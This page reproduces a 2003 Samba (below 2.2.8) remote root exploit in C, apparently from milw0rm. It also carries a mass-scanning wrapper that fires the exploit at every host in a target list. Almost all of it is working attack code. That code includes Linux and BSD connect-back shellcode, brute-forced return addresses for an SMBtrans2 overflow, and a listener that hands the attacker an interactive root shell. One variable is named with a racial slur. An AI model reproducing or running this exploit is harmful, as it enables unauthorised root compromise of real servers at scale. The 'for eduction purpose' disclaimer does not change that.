<html><head><title>Samba 2.2.8 (Bruteforce Method) Remote Root Exploit</title></head><pre>/* 
 * Mass Samba Exploit by Schizoprenic
 * Xnuxer-Research (c) 2003
 * This code just for eduction purpose 
 */

#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;sys/stat.h&gt; 

void usage(char *s)
{
  printf(&quot;Usage: %s  \n&quot;,s);
  exit(-1);
}

int main(int argc, char **argv)
{
  printf(&quot;Mass Samba Exploit by Schizoprenic\n&quot;);
  if(argc != 3) usage(argv[0]);
  scan(argv[1], argv[2]);
  return 0;
}

int scan(char *fl, char *bind_ip)
{
  FILE *nigger,*fstat;
  char buf[512];
  char cmd[100];
  int i;
  struct stat st;
   
  if((nigger=fopen(fl,&quot;r&quot;)) == NULL) {
    fprintf(stderr,&quot;File %s not found!\n&quot;, fl);
    return -1;
  }

  while(fgets(buf,512,nigger) != NULL)
  {
    if(buf[strlen(buf)-1]=='\n') buf[strlen(buf)-1]=0;
    for (i=0;i&lt;4;i++) {
       sprintf(cmd, &quot;./smb %d %s %s&quot;, i, buf, bind_ip);
       printf(&quot;\nTrying get root %s use type %d ...\n&quot;,buf,i);
       system(cmd);
       if (stat(&quot;.ROOT&quot;, &amp;st) != -1) {
          unlink(&quot;.ROOT&quot;);
          break; 
       }
    }    
  }
  fclose(nigger);
  printf(&quot;\nMass exploiting finished.\n&quot;);
}


/*
 *  Samba Remote Root Exploit by Schizoprenic from Xnuxer-Labs, 2003.
 *  Using connect back method and brute force mode.
 *  I just create &amp; modify some code and ripped too :P 
 *  Create on May, 12st 2003
 *
 *  Thanks to eDSee (netric.org), Sambal is nice exploit bro...
 *  References: trans2root.pl, 0x333hate.c, sambal.c
 *  This code just for eduction purpose 
 *
 *  XNUXER RESEARCH LABORATORY
 *  Official Site: http://infosekuriti.com
 *  Contact Email: xnuxer@yahoo.com, xnuxer@hackermail.com
 */

#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 

char
linux_connect_back[] =
    /* fork(), execve sh -c [client] [host to bounce to], term=xterm */
    &quot;\x31\xc0\x31\xff\xb0\x02\xcd\x80\x39\xc7\x74\x7e\x31\xc0\x50&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x89\xe1\x50\x66\x68&quot;
    &quot;\x2d\x63\x89\xe3\x50\x66\x68\x73\x68\x89\xe0\x57\x51\x53\x50&quot;
    &quot;\x89\xe1\x31\xc0\x50\x66\x68\x72\x6d\x68\x3d\x78\x74\x65\x68&quot;
    &quot;\x54\x45\x52\x4d\x89\xe2\x50\x52\x89\xe2\x57\x68\x6e\x2f\x73&quot;
    &quot;\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80\x31\xc0\xb0&quot;
    &quot;\x01\xcd\x80&quot;

    /* connect back shellcode (port=0xb0ef) */
    &quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51&quot;
    &quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51&quot;
    &quot;\x68\x41\x42\x43\x44\x66\x68\xb0\xef\xb1\x02\x66\x51\x89\xe7\xb3&quot;
    &quot;\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1&quot;
    &quot;\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80&quot;
    &quot;\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3&quot;
    &quot;\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;
    &quot;\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0&quot;
    &quot;\x01\xcd\x80&quot;;

char
bsd_connect_back[] =
    /* fork(), execve sh -c [client] [host to bounce to], term=xterm */
    &quot;\x31\xc0\x31\xff\xb0\x02\xcd\x80\x39\xc7\x74\x7e\x31\xc0\x50&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20&quot;
    &quot;\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20&quot;
    &quot;\x68\x20\x20\x20\x20\x89\xe1\x50\x66\x68\x2d\x63\x89\xe3\x50&quot;
    &quot;\x66\x68\x73\x68\x89\xe0\x57\x51\x53\x50\x89\xe1\x31\xc0\x50&quot;
    &quot;\x66\x68\x72\x6d\x68\x3d\x78\x74\x65\x68\x54\x45\x52\x4d\x89&quot;
    &quot;\xe2\x50\x52\x89\xe2\x57\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62&quot;
    &quot;\x69\x89\xe3\x50\x52\x51\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0&quot;
    &quot;\x01\xcd\x80&quot;

    /* connect back shellcode (port=0xb0ef) */
    &quot;\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0&quot;
    &quot;\x61\xcd\x80\x31\xd2\x52\x52\x68\x41\x41\x41\x41\x66\x68\xb0\xef&quot;
    &quot;\xb7\x02\x66\x53\x89\xe1\xb2\x10\x52\x51\x50\x52\x89\xc2\x31\xc0&quot;
    &quot;\xb0\x62\xcd\x80\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80&quot;
    &quot;\x31\xc0\x50\x52\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x52&quot;
    &quot;\x50\xb0\x5a\xcd\x80\x31\xc0\x43\x53\x52\x50\xb0\x5a\xcd\x80\x31&quot;
    &quot;\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54&quot;
    &quot;\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;;

typedef struct {
	unsigned char type;
	unsigned char flags;
	unsigned short length;
} NETBIOS_HEADER;

typedef struct {
	unsigned char protocol[4];
	unsigned char command;
	unsigned short status;
	unsigned char reserved;
	unsigned char  flags;
	unsigned short flags2;
	unsigned char  pad[12];
	unsigned short tid;
	unsigned short pid;
	unsigned short uid;
	unsigned short mid;
} SMB_HEADER;

pid_t childs[50];
int LOOP = 1;
struct sockaddr_in serv_addr;
int sock_listen, client;
int exploit_pid;
int listen_pid;
int port_listen = 45295;

void 
usage(char *prog) 
{
int i;

   fprintf(stdout, &quot;Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic\n&quot;
                   &quot;Connect back method, Xnuxer-Labs, 2003.\n&quot;
                   &quot;Usage  : %s   \n&quot;
                   &quot;Targets:\n&quot;
                   &quot;         0 = Linux\n&quot;
                   &quot;         1 = FreeBSD/NetBSD\n&quot;
                   &quot;         2 = OpenBSD 3.0 and prior\n&quot;
                   &quot;         3 = OpenBSD 3.2 - non-exec stack\n\n&quot;, prog);      
   exit(1);
}

int 
Connect(int fd, char *ip, unsigned int port, unsigned int time_out) 
{
	/* ripped from no1 */

	int                      flags;
	int                      select_status;
	fd_set                   connect_read, connect_write;
	struct timeval           timeout;
	int                      getsockopt_length = 0;
	int                      getsockopt_error = 0;
	struct sockaddr_in       server;
	bzero(&amp;server, sizeof(server));
	server.sin_family = AF_INET;
	inet_pton(AF_INET, ip, &amp;server.sin_addr);
	server.sin_port = htons(port);

	if((flags = fcntl(fd, F_GETFL, 0)) &lt; 0) {
		close(fd);
    		return -1;
  	}
  
	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) &lt; 0) {
		close(fd);
    		return -1;
  	}
  	
	timeout.tv_sec = time_out;
	timeout.tv_usec = 0;
	FD_ZERO(&amp;connect_read);
	FD_ZERO(&amp;connect_write);
	FD_SET(fd, &amp;connect_read);
	FD_SET(fd, &amp;connect_write);

	if((connect(fd, (struct sockaddr *) &amp;server, sizeof(server))) &lt; 0) {
		if(errno != EINPROGRESS) {
      			close(fd);
      			return -1;
    		}
  	}
	else {
		if(fcntl(fd, F_SETFL, flags) &lt; 0) {
			close(fd);
      			return -1;
    		}
    		
		return 1;

	}

	select_status = select(fd + 1, &amp;connect_read, &amp;connect_write, NULL, &amp;timeout);

	if(select_status == 0) {
		close(fd);
		return -1;

	}

	if(select_status == -1) {
		close(fd);
		return -1;
	}

	if(FD_ISSET(fd, &amp;connect_read) || FD_ISSET(fd, &amp;connect_write)) {
		if(FD_ISSET(fd, &amp;connect_read) &amp;&amp; FD_ISSET(fd, &amp;connect_write)) {
			getsockopt_length = sizeof(getsockopt_error);

			if(getsockopt(fd, SOL_SOCKET, SO_ERROR, &amp;getsockopt_error, &amp;getsockopt_length)
&lt; 0) {
				errno = ETIMEDOUT;
				close(fd);
				return -1;
			}

			if(getsockopt_error == 0) {
				if(fcntl(fd, F_SETFL, flags) &lt; 0) {
					close(fd);
					return -1;
				}
				return 1;
		        } 

			else {
				errno = getsockopt_error;
				close(fd);
				return (-1);
				}

			}
		}
	else {
		close(fd);
		return 1;
	}

	if(fcntl(fd, F_SETFL, flags) &lt; 0) {
		close(fd);
		return -1;
	}
	return 1;
}

int 
read_timer(int fd, unsigned int time_out)
{

	/* ripped from no1 */

	int                      flags;
	int                      select_status;
	fd_set                   fdread;
	struct timeval           timeout;

	if((flags = fcntl(fd, F_GETFL, 0)) &lt; 0) {
		close(fd);
		return (-1);
	}

	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) &lt; 0) {
		close(fd);
		return (-1);
	}

	timeout.tv_sec = time_out;
	timeout.tv_usec = 0;
	FD_ZERO(&amp;fdread);
	FD_SET(fd, &amp;fdread);
	select_status = select(fd + 1, &amp;fdread, NULL, NULL, &amp;timeout);

	if(select_status == 0) {
		close(fd);
		return (-1);
	}

	if(select_status == -1) {
		close(fd);
		return (-1);
	}
  
	if(FD_ISSET(fd, &amp;fdread)) {
  
  		if(fcntl(fd, F_SETFL, flags) &lt; 0) {
			close(fd);
      			return -1;
    		}
    		
		return 1;
	
	} 
	else {
		close(fd);
		return 1;

	}
}

int
write_timer(int fd, unsigned int time_out)
{

	/* ripped from no1 */

	int                      flags;
	int                      select_status;
	fd_set                   fdwrite;
	struct timeval           timeout;

	if((flags = fcntl(fd, F_GETFL, 0)) &lt; 0) {    
		close(fd);
		return (-1);
	}
	
	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) &lt; 0) {
		close(fd);
		return (-1);
  	}
  	
	timeout.tv_sec = time_out;
	timeout.tv_usec = 0;
	FD_ZERO(&amp;fdwrite);
	FD_SET(fd, &amp;fdwrite);

	select_status = select(fd + 1, NULL, &amp;fdwrite, NULL, &amp;timeout);

	if(select_status == 0) {
		close(fd);
		return -1;
	}
	
	if(select_status == -1) {
		close(fd);
		return -1;
	}

	if(FD_ISSET(fd, &amp;fdwrite)) {
		if(fcntl(fd, F_SETFL, flags) &lt; 0) {
			close(fd);
			return -1;
		}
		return 1;
	}
	else { 
		close(fd);
		return -1;
	}
}

int 
start_session(int sock)
{
	char buffer[1000];
	char response[4096];
	char session_data1[] 	= &quot;\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00&quot;;
        char session_data2[] 	= &quot;\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79&quot;
		                  &quot;\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24&quot;;
	
        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

	memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader-&gt;type 	= 0x00;         /* session message */
        netbiosheader-&gt;flags 	= 0x00;
        netbiosheader-&gt;length 	= htons(0x2E);

        smbheader-&gt;protocol[0] 	= 0xFF;
        smbheader-&gt;protocol[1] 	= 'S';
        smbheader-&gt;protocol[2] 	= 'M';
        smbheader-&gt;protocol[3] 	= 'B';
        smbheader-&gt;command 	= 0x73;         /* session setup */
        smbheader-&gt;flags 	= 0x08;         /* caseless pathnames */
        smbheader-&gt;flags2 	= 0x01;         /* long filenames supported */
        smbheader-&gt;pid 		= getpid() &amp; 0xFFFF;
	smbheader-&gt;uid          = 100;
        smbheader-&gt;mid 		= 0x01;

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data1,
sizeof(session_data1) - 1);

	if(write_timer(sock, 3) == 1)
		if (send(sock, buffer, 50, 0) &lt; 0) return -1;

	memset(response, 0x00, sizeof(response));

	if (read_timer(sock, 3) == 1)
		if (read(sock, response, sizeof(response) - 1) &lt; 0) return -1;
	
        netbiosheader = (NETBIOS_HEADER *)response;
        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));

	//if (netbiosheader-&gt;type != 0x00) fprintf(stderr, &quot;+ Recieved a non session message\n&quot;);

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader-&gt;type     = 0x00;         /* session message */
        netbiosheader-&gt;flags    = 0x00;
        netbiosheader-&gt;length   = htons(0x3C);

        smbheader-&gt;protocol[0]  = 0xFF;
        smbheader-&gt;protocol[1]  = 'S';
        smbheader-&gt;protocol[2]  = 'M';
        smbheader-&gt;protocol[3]  = 'B';
        smbheader-&gt;command      = 0x70;         /* start connection */
	smbheader-&gt;pid          = getpid() &amp; 0xFFFF;
	smbheader-&gt;tid		= 0x00;
        smbheader-&gt;uid          = 100;

	memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2, sizeof(session_data2)
- 1);

        if(write_timer(sock, 3) == 1)
                if (send(sock, buffer, 64, 0) &lt; 0) return -1;

        memset(response, 0x00, sizeof(response));

        if (read_timer(sock, 3) == 1)
                if (read(sock, response, sizeof(response) - 1) &lt; 0) return -1;

        netbiosheader = (NETBIOS_HEADER *)response;
        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));

        if (netbiosheader-&gt;type != 0x00) return -1;

        return 0;
}

int
exploit_normal(int sock, unsigned long ret, char *shellcode)
{

	char buffer[4000];
        char exploit_data[] =
                &quot;\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
                &quot;\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;

		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
                &quot;\x00\x00\x00\x90&quot;;

	int i = 0;
	unsigned long dummy = ret - 0x90;

        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

	memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader-&gt;type             = 0x00;         /* session message */
        netbiosheader-&gt;flags            = 0x04;
        netbiosheader-&gt;length           = htons(2096);

        smbheader-&gt;protocol[0]          = 0xFF;
        smbheader-&gt;protocol[1]          = 'S';
        smbheader-&gt;protocol[2]          = 'M';
        smbheader-&gt;protocol[3]          = 'B';
        smbheader-&gt;command              = 0x32;         /* SMBtrans2 */
	smbheader-&gt;tid			= 0x01;
        smbheader-&gt;uid                  = 100;

	memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data),
0x90, 3000);

	buffer[1096] = 0xEB;
	buffer[1097] = 0x70;

	for (i = 0; i &lt; 4 * 24; i += 8) {
		memcpy(buffer + 1099 + i, &amp;dummy, 4);
		memcpy(buffer + 1103 + i, &amp;ret,   4);
	}

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), 
			exploit_data, sizeof(exploit_data) - 1);
	memcpy(buffer + 1800, shellcode, strlen(shellcode));

	if(write_timer(sock, 3) == 1) {
		if (send(sock, buffer, sizeof(buffer) - 1, 0) &lt; 0) return -1;
		return 0;
	}

	return -1;
}

int
exploit_openbsd32(int sock, unsigned long ret, char *shellcode)
{
        char buffer[4000];

        char exploit_data[] =
                &quot;\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
                &quot;\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
                &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
                &quot;\x00\x00\x00\x90&quot;;

        int i = 0;
        unsigned long dummy = ret - 0x30;
        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader-&gt;type             = 0x00;         /* session message */
        netbiosheader-&gt;flags            = 0x04;
        netbiosheader-&gt;length           = htons(2096);

        smbheader-&gt;protocol[0]          = 0xFF;
        smbheader-&gt;protocol[1]          = 'S';
        smbheader-&gt;protocol[2]          = 'M';
        smbheader-&gt;protocol[3]          = 'B';
        smbheader-&gt;command              = 0x32;         /* SMBtrans2 */
        smbheader-&gt;tid                  = 0x01;
        smbheader-&gt;uid                  = 100;

        memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data),
0x90, 3000);

	for (i = 0; i &lt; 4 * 24; i += 4)
		memcpy(buffer + 1131 + i, &amp;dummy, 4);
		
        memcpy(buffer + 1127, &amp;ret,      4);

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),
                        exploit_data, sizeof(exploit_data) - 1);

        memcpy(buffer + 1100 - strlen(shellcode), shellcode, strlen(shellcode));

        if(write_timer(sock, 3) == 1) {
                if (send(sock, buffer, sizeof(buffer) - 1, 0) &lt; 0) return -1;
                return 0;
        }

        return -1;
}


void shell(int sock)
{
 fd_set  fd_read;
 char buff[1024], *cmd=&quot;uname -a;id;\n&quot;;
 int n;

 send(sock, cmd, strlen(cmd), 0);

 while(1) {
  FD_SET(sock,&amp;fd_read);
  FD_SET(0,&amp;fd_read);

  if(select(sock+1,&amp;fd_read,NULL,NULL,NULL)&lt;0) break;

  if( FD_ISSET(sock, &amp;fd_read) ) {
   n=read(sock,buff,sizeof(buff));
   if (n == 0) {
       printf (&quot;Connection closed.\n&quot;);
       exit(EXIT_FAILURE);
   } else if (n &lt; 0) {
       perror(&quot;read remote&quot;);
       exit(EXIT_FAILURE);
   }
   write(1,buff,n);
  }

  if ( FD_ISSET(0, &amp;fd_read) ) {
    if((n=read(0,buff,sizeof(buff)))&lt;=0){
      perror (&quot;read user&quot;);
      exit(EXIT_FAILURE);
    }
    write(sock,buff,n);
  }
 }
 close(sock); 
}

void GoAway() 
{
   exit(0);
}

void start_listen()
{
FILE *fstat;
int cpid;
   
LISTENER:

  bzero(&amp;serv_addr, sizeof(serv_addr));
  serv_addr.sin_family=2;
  serv_addr.sin_addr.s_addr=0;
  serv_addr.sin_port=htons(port_listen); 
  sock_listen=socket(2,1,6);

  if(bind(sock_listen,(struct sockaddr *)&amp;serv_addr,16)) 
  {   
      port_listen++;
      goto LISTENER;       
  }
   
  if(listen(sock_listen,1)) 
  {
      perror(&quot;listen&quot;);
      exit(1);
  }
   
  fprintf(stdout, &quot;[+] Listen on port: %d\n&quot;,port_listen);
   
  cpid = fork();
 
  if (cpid) {
     client=accept(sock_listen,0,0);
     LOOP = 0;
     kill(SIGUSR2, exploit_pid);
     if (client &gt; 0) {
        fprintf(stdout, &quot;[+] Yeah, I have a root ....!\n&quot;
                      &quot;------------------------------\n&quot;);
        fstat=fopen(&quot;.ROOT&quot;, &quot;a&quot;);  //needed by mass.c
        fclose(fstat);
        shell(client);
     }
     exit(0);
  }
}

int
main (int argc,char *argv[])
{
   char *shellcode = NULL;
   int typeos	= -1;
   int port		= 139;
   int sock		= 0;
   int i		= 0;
   int status	= 0;
   int m		= 0;
   int ip1		= 0;
   int ip2		= 0;
   int ip3		= 0;
   int ip4		= 0;
   int sta		= 0;
   int STEPS	= 512;
   int ENDLOOP    = 64;
   char *desc; 
   unsigned long MAX_CHILDS  = 40;
   unsigned long ret         = 0x0;
   unsigned short int  a_port;
   struct sockaddr_in addr1;
   struct hostent *he;
   struct stat st;
   
      if (argc != 4) usage(argv[0]);
   
      typeos = atoi(argv[1]);
      if (typeos &gt; 3) {
          fprintf(stdout, &quot;Os type out of list!\n&quot;);
          exit(1);
      }

      he = gethostbyname(argv[2]);

      if (he == NULL) {
          fprintf(stderr, &quot;Unable to resolve\n&quot;);
          return -1;
      }

      listen_pid = getpid();
      start_listen();
      exploit_pid = listen_pid + 1;

      //fprintf(stdout, &quot;[+] Listen pid: %d, exploit pid: %d\n&quot;, listen_pid,exploit_pid);

      sscanf(argv[3], &quot;%d.%d.%d.%d&quot;, &amp;ip1, &amp;ip2, &amp;ip3, &amp;ip4);		
      linux_connect_back[171] = ip1; bsd_connect_back[162] = ip1;
      linux_connect_back[172] = ip2; bsd_connect_back[163] = ip2;
      linux_connect_back[173] = ip3; bsd_connect_back[164] = ip3;
      linux_connect_back[174] = ip4; bsd_connect_back[165] = ip4;
				
      fprintf(stdout, &quot;[+] Connecting back to: [%d.%d.%d.%d:%d]\n&quot;, 
					ip1, ip2, ip3, ip4, port_listen);

      a_port = htons(port_listen);
      
      linux_connect_back[177]= (a_port) &amp; 0xff;
      linux_connect_back[178]= (a_port &gt;&gt; 8) &amp; 0xff;
      bsd_connect_back[168]= (a_port) &amp; 0xff;
      bsd_connect_back[169]= (a_port &gt;&gt; 8) &amp; 0xff;

      switch(typeos) {
      case 0:
              desc = &quot;Linux&quot;;
              ret = 0xc0000000;
              shellcode = linux_connect_back;
              break;
      case 1:
              desc = &quot;FreeBSD/NetBSD&quot;;
              ret = 0xbfc00000;
              shellcode = bsd_connect_back;
              break;
      case 2:
              desc = &quot;OpenBSD 3.1 and prior&quot;;
              ret = 0xdfc00000;
              shellcode = bsd_connect_back;
              break;
      case 3:
              desc = &quot;OpenBSD 3.2 non-exec stack&quot;;
              ret = 0x00170000;
              shellcode = bsd_connect_back;
              break;
      }

      fprintf(stdout, &quot;[+] Target: %s\n&quot;, desc);
      memcpy(&amp;addr1.sin_addr, he-&gt;h_addr, he-&gt;h_length);

      addr1.sin_family = AF_INET;
      addr1.sin_port	 = htons(port);	

      fprintf(stdout, &quot;[+] Connected to [%s:%d]\n&quot;, (char *)inet_ntoa(addr1.sin_addr),
port);
      fprintf(stdout, &quot;[+] Please wait in seconds...!\n&quot;);

      signal(SIGUSR2, GoAway);
   
      for (i = 0; i &lt; 50; i++) childs[i] = -1;
      i = 0; m = 0;

      while (LOOP) {

           if ((sock = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) {
              fprintf(stderr, &quot;[+] socket() error.\n&quot;);
              exit(-1);
           }

           ret -= STEPS; i++;
           if ((ret &amp; 0xff) == 0x00 &amp;&amp; typeos != 3) ret++;             

           m++; 
           //fflush(0);
           //fprintf(stdout, &quot;[+] Return Address: 0x%08x [%02d]\n&quot;, (unsigned int)ret,
m);

           usleep(150000);

           switch (childs[i] = fork()) {
           case 0:  
                  if (connect(sock, (struct sockaddr *)&amp;addr1, sizeof(addr1)) == -
1) { 
                      //fprintf(stderr, &quot;[+] connect() error.\n&quot;);
                      close(sock);
                      exit(-1);
                  }
			
                 start_session(sock);
                 sleep(3);
		     		         
                 if (typeos != 3) {
                           if (exploit_normal(sock, ret, shellcode) &lt; 0) {
                              //fprintf(stderr, &quot; -&gt; Failed.\n&quot;);
                              close(sock);
                              exit(-1);
                           }
                 } else {
                           if (exploit_openbsd32(sock, ret, shellcode) &lt; 0) {
                              //fprintf(stderr, &quot; -&gt; Failed.\n&quot;);
                              close(sock);
                              exit(-1);
                           }
                  }
                  sleep(5);
                  close(sock);
                  exit(0);
                  break;
           case -1:
                  exit(-1);
                  break;
           default:
                  if (i &gt; MAX_CHILDS - 2) {
                      wait(&amp;status);
                      i--;
                  }
                  break;
           } 

           if (m == ENDLOOP) LOOP = 0;
      } 	   

      if (stat(&quot;.ROOT&quot;, &amp;st) != -1) 
         kill(SIGUSR2, listen_pid);
      else {	
           fprintf(stdout, &quot;[+] Dohh, exploit failed.\n&quot;);
	   close(client); close(sock_listen);
           kill(listen_pid, SIGUSR2);
	   sleep(2);
	   exit(0);
      }
}

// milw0rm.com [2003-07-13]</pre></html>